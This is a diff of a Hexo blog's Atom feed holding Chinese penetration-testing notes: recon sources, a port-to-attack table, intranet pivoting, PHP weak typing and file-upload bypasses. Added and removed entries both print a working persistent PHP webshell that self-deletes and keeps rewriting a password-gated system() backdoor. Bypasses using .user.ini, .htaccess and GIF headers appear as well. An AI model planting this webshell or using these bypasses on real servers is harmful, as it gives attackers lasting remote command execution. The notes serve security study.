@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-09-14T06:34:53.129Z</updated>
+  <updated>2023-09-18T11:45:17.923Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,116 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>信息收集</title>
+    <link href="http://example.com/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+    <id>http://example.com/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
+    <published>2023-09-18T10:02:02.193Z</published>
+    <updated>2023-09-18T11:45:17.923Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h1><p><a href="https://www.whois.com/whois">whois网站</a></p><p><a href="https://beian.miit.gov.cn/state/outPortal/loginPortal.action/#/Integrated/recordQuery">icp备案查询</a></p><p><a href="https://www.tianyancha.com/">天眼查</a></p><p><a href="https://www.google.com/">google</a></p><pre><code>google部分语法site    指定域名inurl   指定url中关键字intext  指定网页正文中的关键字intitle 指定网页标题的关键字filetype    指定文件类型</code></pre><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><p>利用搜索引擎枚举或者扫描工具</p><p>第三方聚合网站<a href="https://dnsdumpster.com/">dnsdumpster</a></p><p>查询证书授权机构的公共日志<a href="https://crt.sh/">crt.sh</a></p><p><a href="https://search.censys.io/">censys</a></p><h2 id="服务器信息"><a href="#服务器信息" class="headerlink" title="服务器信息"></a>服务器信息</h2><p>抓包看http头可以得到很多重要信息，server类型、版本,php版本等等</p><h1 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h1><p>根据开放的端口可以制定攻击计划</p><table><thead><tr><th>文件共享服务端口</th><th>端口作用</th><th>攻击</th></tr></thead><tbody><tr><td>21/22/69</td><td>ftp/tftp文件传输协议</td><td>匿名上传、爆破、嗅探</td></tr><tr><td>2049</td><td>nfs服务</td><td>配置不当</td></tr><tr><td>139</td><td>samba服务</td><td>爆破，未授权访问</td></tr><tr><td>389</td><td>ldap目录访问协议</td><td>匿名访问，注入，弱口令</td></tr></tbody></table><table><thead><tr><th>远程连接端口</th><th>端口作用</th><th>攻击</th></tr></thead><tbody><tr><td>22</td><td>ssh远程连接</td><td>爆破，文件传输</td></tr><tr><td>23</td><td>telnet连接</td><td>爆破，弱口令</td></tr><tr><td>3389</td><td>rdp远程桌面</td><td>后门，爆破</td></tr><tr><td>5900</td><td>vnc</td><td>弱口令</td></tr><tr><td>5632</td><td>pyanywhere</td><td>代码执行</td></tr></tbody></table><table><thead><tr><th>web应用端口</th><th>端口作用</th><th>攻击</th></tr></thead><tbody><tr><td>80/443/8080</td><td>web服务</td><td>web攻击</td></tr><tr><td>7001/7002</td><td>WebLogic控制台</td><td>java反序列化，弱口令</td></tr></tbody></table>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;域名收集&quot;&gt;&lt;a href=&quot;#域名收集&quot; class=&quot;headerlink&quot; title=&quot;域名收集&quot;&gt;&lt;/a&gt;域名收集&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.whois.com/whois&quot;&gt;whois网站&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a hr</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>工具</title>
+    <link href="http://example.com/%E5%B7%A5%E5%85%B7/"/>
+    <id>http://example.com/%E5%B7%A5%E5%85%B7/</id>
+    <published>2023-09-18T09:53:36.605Z</published>
+    <updated>2023-09-18T10:01:17.106Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p>nmap主要用于扫描存活主机</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;nmap&quot;&gt;&lt;a href=&quot;#nmap&quot; class=&quot;headerlink&quot; title=&quot;nmap&quot;&gt;&lt;/a&gt;nmap&lt;/h1&gt;&lt;p&gt;nmap主要用于扫描存活主机&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>内网渗透</title>
+    <link href="http://example.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    <id>http://example.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</id>
+    <published>2023-09-16T05:53:58.546Z</published>
+    <updated>2023-09-18T09:55:03.285Z</updated>
+    
+    <content type="html"><![CDATA[<p>内网渗透首先需要一台内网主机，可以通过攻击外网服务器，获取权限，作为跳板，攻击内网</p><p>也可以直接利用内网办公电脑等等直接进行攻击</p><hr><p><strong>本篇主要讲述在已拥有内网主机权限的情况下，如何进行内网渗透</strong></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="存活主机发现"><a href="#存活主机发现" class="headerlink" title="存活主机发现"></a>存活主机发现</h2><p>主要是通过<code>ping</code>扫描，接着端口扫描，可以利用工具也可以自行编写脚本进行扫描</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;内网渗透首先需要一台内网主机，可以通过攻击外网服务器，获取权限，作为跳板，攻击内网&lt;/p&gt;
+&lt;p&gt;也可以直接利用内网办公电脑等等直接进行攻击&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;本篇主要讲述在已拥有内网主机权限的情况下，如何进行内网渗透&lt;/strong&gt;&lt;/p&gt;
+&lt;h1</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>PHP文件上传</title>
+    <link href="http://example.com/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <id>http://example.com/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
+    <published>2023-09-15T06:40:30.234Z</published>
+    <updated>2023-09-15T06:49:56.157Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h1><p>不死马，即难以清除的木马。<br>一般原理为：在可以上传文件的情况下，上传一个可执行文件，这个文件的作用是在服务端创建一个进程，然后删除自身，创建的进程会不停的在服务端生成木马文件。<br>网上最常见的脚本为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.shell.php'</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_GET["pass"])=="2591c98b70119fe624898b1e424b5e91")&#123;@system($_POST[cmd]);&#125; ?>'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="前端限制文件后缀"><a href="#前端限制文件后缀" class="headerlink" title="前端限制文件后缀"></a>前端限制文件后缀</h1><p>通过抓包修改即可</p><h1 id="后端限制文件后缀"><a href="#后端限制文件后缀" class="headerlink" title="后端限制文件后缀"></a>后端限制文件后缀</h1><p>想要绕过后端限制，最重要的是知道过滤规则</p><p>比如文件头检查我们就可以加上图片文件头，如<code>GIF8a</code></p><p>文件内容检查就可以用<code>&lt;script language=&#39;php&#39;&gt;</code>来代替 <code>&lt;?php</code></p><p>或者利用解析漏洞，加上无法解析的后缀，如上传<code>shell.php.abc</code>等等</p><h2 id="通过上传-user-ini文件或-htaccess文件来绕过"><a href="#通过上传-user-ini文件或-htaccess文件来绕过" class="headerlink" title="通过上传.user.ini文件或.htaccess文件来绕过"></a>通过上传.user.ini文件或.htaccess文件来绕过</h2><blockquote><p>PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>两个新的 INI 指令， user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。</p><p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p><p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p></blockquote><p>.user.ini</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">auto_prepend_file=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file_path</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>.htaccess</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">AddType application/x-httpd-php .jpg <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FileMatch</span> <span class="token attr-name">"&lt;file_name</span><span class="token punctuation">></span></span>">SetHandler application/x-httpd-php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FileMatch</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><p>也可以利用解析漏洞，加上无法解析的后缀，如上传shell.php.abc</p><hr><h1 id="尚在更新中"><a href="#尚在更新中" class="headerlink" title="尚在更新中"></a>尚在更新中</h1>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;不死马&quot;&gt;&lt;a href=&quot;#不死马&quot; class=&quot;headerlink&quot; title=&quot;不死马&quot;&gt;&lt;/a&gt;不死马&lt;/h1&gt;&lt;p&gt;不死马，即难以清除的木马。&lt;br&gt;一般原理为：在可以上传文件的情况下，上传一个可执行文件，这个文件的作用是在服务端创建一个进程，然后</summary>
+      
+    
+    
+    
+    <category term="PHP文件上传" scheme="http://example.com/categories/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>PHP代码审计</title>
+    <link href="http://example.com/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    <id>http://example.com/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
+    <published>2023-09-15T06:35:11.235Z</published>
+    <updated>2023-09-15T06:39:36.451Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="弱语言类型"><a href="#弱语言类型" class="headerlink" title="弱语言类型"></a>弱语言类型</h1><p>PHP是一门弱类型语言，当涉及“==”判断时，它的表现是有一些奇特的。<br>例如，“a==0”将会得到true，“a==1”将会得到false。</p><p>原理：PHP语言中在涉及“==”判断时，如果运算符两边分别为字符串（不以数字开头的字符串），会将字符串转化为数字0，再进行比较。如果是以数字开头的字符串，那么它将会转化成开头的数字（即第一个字母前的所有数字）。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"787abe"</span><span class="token operator">=</span><span class="token number">787</span>   <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"abc"</span><span class="token operator">=</span><span class="token number">0</span>    <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"1a2b"</span><span class="token operator">=</span><span class="token number">1</span>    <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"a12b"</span><span class="token operator">=</span><span class="token number">0</span>    <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"000123abc"</span><span class="token operator">=</span><span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例外：(int)”1e2”==100，在PHP中若像这种格式的字符串转化成数字，PHP会将其视为科学计数法。<br>(int)”1e2abc”=(int)”1e2”=100<br>(int )”1eabce”=1</p><h1 id="尚在更新中"><a href="#尚在更新中" class="headerlink" title="尚在更新中"></a>尚在更新中</h1>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;弱语言类型&quot;&gt;&lt;a href=&quot;#弱语言类型&quot; class=&quot;headerlink&quot; title=&quot;弱语言类型&quot;&gt;&lt;/a&gt;弱语言类型&lt;/h1&gt;&lt;p&gt;PHP是一门弱类型语言，当涉及“==”判断时，它的表现是有一些奇特的。&lt;br&gt;例如，“a==0”将会得到true，“</summary>
+      
+    
+    
+    
+    <category term="PHP代码审计" scheme="http://example.com/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>SQL注入</title>
@@ -57,113 +167,6 @@
     
     <category term="wp" scheme="http://example.com/categories/wp/"/>
     
-    
-  </entry>
-  
-  <entry>
-    <title>不死马</title>
-    <link href="http://example.com/%E4%B8%8D%E6%AD%BB%E9%A9%AC/"/>
-    <id>http://example.com/%E4%B8%8D%E6%AD%BB%E9%A9%AC/</id>
-    <published>2023-09-05T01:29:34.714Z</published>
-    <updated>2022-05-25T07:22:56.269Z</updated>
-    
-    <content type="html"><![CDATA[<p>不死马，即难以清除的木马。<br>一般原理为：在可以上传文件的情况下，上传一个可执行文件，这个文件的作用是在服务端创建一个进程，然后删除自身，创建的进程会不停的在服务端生成木马文件。<br>网上最常见的脚本为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.shell.php'</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_GET["pass"])=="2591c98b70119fe624898b1e424b5e91")&#123;@system($_POST[cmd]);&#125; ?>'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;不死马，即难以清除的木马。&lt;br&gt;一般原理为：在可以上传文件的情况下，上传一个可执行文件，这个文件的作用是在服务端创建一个进程，然后删除自身，创建的进程会不停的在服务端生成木马文件。&lt;br&gt;网上最常见的脚本为&lt;/p&gt;
-&lt;pre class=&quot;line-numbers lan</summary>
-      
-    
-    
-    
-    <category term="file upload" scheme="http://example.com/categories/file-upload/"/>
-    
-    
-    <category term="basic" scheme="http://example.com/tags/basic/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>shell upload</title>
-    <link href="http://example.com/shell%20upload/"/>
-    <id>http://example.com/shell%20upload/</id>
-    <published>2023-09-05T01:29:34.695Z</published>
-    <updated>2022-04-25T05:04:46.140Z</updated>
-    
-    <content type="html"><![CDATA[<p>前端文件后缀限制</p><ol><li>抓包修改</li></ol><p>后端文件后缀限制</p><ol><li>上传.user.ini文件或.htaccess文件<blockquote><p>PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>两个新的 INI 指令， user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。</p><p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p><p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p></blockquote></li></ol><p>.user.ini</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">auto_prepend_file=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file_path</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>.htaccess</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">AddType application/x-httpd-php .jpg <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FileMatch</span> <span class="token attr-name">"&lt;file_name</span><span class="token punctuation">></span></span>">SetHandler application/x-httpd-php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FileMatch</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>利用解析漏洞，加上无法解析的后缀，如上传shell.php.abc</li></ol><p>文件头检查</p><ol><li>加上图片文件头，如GIF8a</li></ol><p>文件内容检查</p><ol><li>&lt;script language=’php’&gt; 代替 &lt;?php</li><li></li></ol>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;前端文件后缀限制&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;抓包修改&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;后端文件后缀限制&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;上传.user.ini文件或.htaccess文件&lt;blockquote&gt;
-&lt;p&gt;PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CG</summary>
-      
-    
-    
-    
-    <category term="file upload" scheme="http://example.com/categories/file-upload/"/>
-    
-    
-    <category term="basic" scheme="http://example.com/tags/basic/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>php字符串与数值比较</title>
-    <link href="http://example.com/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%80%BC%E6%AF%94%E8%BE%83/"/>
-    <id>http://example.com/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%80%BC%E6%AF%94%E8%BE%83/</id>
-    <published>2023-09-05T01:29:34.692Z</published>
-    <updated>2022-04-25T05:07:26.010Z</updated>
-    
-    <content type="html"><![CDATA[<p>PHP是一门弱类型语言，当涉及“==”判断时，它的表现是有一些奇特的。<br>例如，“a==0”将会得到true，“a==1”将会得到false。</p><p>原理：PHP语言中在涉及“==”判断时，如果运算符两边分别为字符串（不以数字开头的字符串），会将字符串转化为数字0，再进行比较。如果是以数字开头的字符串，那么它将会转化成开头的数字（即第一个字母前的所有数字）。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"787abe"</span><span class="token operator">=</span><span class="token number">787</span>   <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"abc"</span><span class="token operator">=</span><span class="token number">0</span>    <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"1a2b"</span><span class="token operator">=</span><span class="token number">1</span>    <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"a12b"</span><span class="token operator">=</span><span class="token number">0</span>    <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"000123abc"</span><span class="token operator">=</span><span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例外：(int)”1e2”==100，在PHP中若像这种格式的字符串转化成数字，PHP会将其视为科学计数法。<br>(int)”1e2abc”=(int)”1e2”=100<br>(int )”1eabce”=1</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;PHP是一门弱类型语言，当涉及“==”判断时，它的表现是有一些奇特的。&lt;br&gt;例如，“a==0”将会得到true，“a==1”将会得到false。&lt;/p&gt;
-&lt;p&gt;原理：PHP语言中在涉及“==”判断时，如果运算符两边分别为字符串（不以数字开头的字符串），会将字符串转化为数字</summary>
-      
-    
-    
-    
-    <category term="code audit" scheme="http://example.com/categories/code-audit/"/>
-    
-    
-    <category term="basic" scheme="http://example.com/tags/basic/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>web directory</title>
-    <link href="http://example.com/basic_web_directory/"/>
-    <id>http://example.com/basic_web_directory/</id>
-    <published>2023-09-05T01:29:34.687Z</published>
-    <updated>2022-04-25T05:12:49.869Z</updated>
-    
-    <content type="html"><![CDATA[<p><code>nginx</code>网站目录</p><pre class="line-numbers language-none"><code class="language-none">配置文件存放目录：&#x2F;etc&#x2F;nginx主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;code&gt;nginx&lt;/code&gt;网站目录&lt;/p&gt;
-&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;配置文件存放目录：&amp;#x2F;etc&amp;#x2F;nginx
-主配置文件：&amp;#x2F;</summary>
-      
-    
-    
-    
-    <category term="another" scheme="http://example.com/categories/another/"/>
-    
-    
-    <category term="basic" scheme="http://example.com/tags/basic/"/>
     
   </entry>
   
